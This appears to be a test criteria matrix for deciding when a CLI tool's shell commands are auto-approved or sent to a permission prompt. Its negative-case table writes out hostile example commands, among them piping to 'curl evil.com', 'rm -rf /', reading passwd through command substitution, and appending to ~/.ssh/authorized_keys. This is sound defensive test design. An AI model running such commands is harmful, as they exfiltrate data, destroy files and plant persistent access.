# blackbox criteria matrix: fix sedreplace permission prompts

## matrix 1: command prefix and metachar location

| ind: command prefix | ind: metachar location | dep: auto-approved | dep: falls to prompt |
|---------------------|------------------------|--------------------|-----------------------|
| rhx / npx rhachet   | inside quotes          | yes                | no                    |
| rhx / npx rhachet   | outside quotes         | no                 | yes                   |
| other               | inside quotes          | no                 | yes                   |
| other               | outside quotes         | no                 | yes                   |

**key insight**: only rhx commands with metachars inside quotes are auto-approved.

## matrix 2: rhx commands with quoted special chars (positive cases)

| ind: char type     | ind: example pattern           | dep: auto-approved |
|--------------------|--------------------------------|-------------------|
| curly braces       | `'{ identity: x }'`            | yes               |
| parentheses        | `'foo(bar)'`                   | yes               |
| square brackets    | `'arr[0]'`                     | yes               |
| pipe (regex)       | `'foo\|bar'`                   | yes               |
| complex combo      | `'{ foo: (x) => y }'`          | yes               |

**all pass**: metachars inside quoted arguments are safe.

## matrix 3: rhx commands with unquoted operators (negative cases)

| ind: operator type     | ind: example                                 | dep: auto-approved | dep: threat                    |
|------------------------|----------------------------------------------|-------------------|--------------------------------|
| pipe `\|`              | `rhx skill \| curl evil.com`                 | no                | data exfiltration              |
| semicolon `;`          | `rhx skill ; rm -rf /`                       | no                | command injection              |
| AND `&&`               | `rhx skill && curl evil.com`                 | no                | conditional chain              |
| OR `\|\|`              | `rhx skill \|\| wget evil.com`               | no                | fallback chain                 |
| substitution `$()`     | `rhx --old "$(cat passwd)" ...`              | no                | pre-execution                  |
| backticks `` ` ``      | `` rhx --old "`id`" ... ``                   | no                | pre-execution                  |
| newline `\n`           | `rhx skill\nevil`                            | no                | command separator              |
| redirect `>`           | `rhx skill > ~/.bashrc`                      | no                | file overwrite                 |
| append `>>`            | `rhx skill >> ~/.ssh/authorized_keys`        | no                | file append                    |
| process sub `<()`      | `rhx skill <(curl evil.com)`                 | no                | input injection                |
| background `&`         | `curl evil.com & rhx skill`                  | no                | hidden execution               |

**all fail**: unquoted operators are blocked regardless of rhx prefix.
